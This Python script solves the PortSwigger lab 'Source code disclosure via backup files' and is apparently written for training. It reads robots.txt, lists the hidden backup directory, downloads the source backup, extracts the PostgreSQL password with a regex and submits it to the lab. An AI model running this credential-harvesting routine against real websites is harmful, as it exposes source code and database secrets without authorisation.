################################################################
#
# Author: Ahmed Elqalawii
#
# Date: 3/9/2023
#
# PortSwigger LAB: Source code disclosure via backup files
#
# Steps: 1. Fetch /robots.txt file
#        2. List the hidden directory
#        3. Fetch the hidden backup file
#        4. Extract the key
#        5. Submit the answer
#
#################################################################

###########
# imports
###########
import requests
import re
from colorama import Fore

# change this url to your lab
url = "https://0a0d004f03069dc08131cf9d0064000a.web-security-academy.net"

try:
    robots = requests.get(
        f"{url}/robots.txt")  # fetch /robots.txt file
    if robots.status_code == 200:  # if response is OK
        print(Fore.WHITE + "1. Fetching the robots.txt file.. " + Fore.GREEN + "OK")
        hidden_name = re.findall("Disallow: (.*)",
                                 robots.text)[0]  # extract the hidded name
        print(Fore.WHITE + "2. Searching for hidden files.. " +
              Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + hidden_name)
        try:  # try to list the hidden directory
            hidden_dir = requests.get(f"{url}{hidden_name}")
            if hidden_dir.status_code == 200:  # if listing is OK
                print(Fore.WHITE + "3. Fetching the backup directory.. " +
                      Fore.GREEN + "OK")
                backup_path = re.findall(
                    "href='(.*)'>", hidden_dir.text)[0]  # extract the path the the backup file
                print(Fore.WHITE + "4. Extracting the path to the backup file.. " +
                      Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + backup_path)
            try:  # try to fetch the backup file
                backup_file = requests.get(f"{url}{backup_path}")
                if backup_file.status_code == 200:  # if fetching backup file is OK
                    print(Fore.WHITE + "5. Fetching the backup file " +
                          Fore.GREEN + "OK")
                    key = re.findall(
                        r"\"postgres\",\s*\"postgres\",\s*\"(.*)\"", backup_file.text)[0]  # extract the key
                    print(Fore.WHITE + "6. Extracting key.. " +
                          Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + key)
                try:  # try to submit the answer
                    data = {
                        "answer": key
                    }
                    submit_answer = requests.post(
                        f"{url}/submitsolution", data)  # submit the answer
                    if submit_answer.status_code == 200:
                        print(Fore.WHITE + "7. Submitting the answer.. " +
                              Fore.GREEN + "OK")
                        print(
                            Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")

                except:
                    print(
                        Fore.RED + "[!] Failed to submit the answer through exception")
            except:
                print(
                    Fore.RED + "[!] Failed to fetch the backup file through exception")
        except:
            print(
                Fore.RED + "[!] Failed to list the hidden directory through exception")
except:
    print(Fore.RED + "[!] Failed to fetch /robots.txt through exception")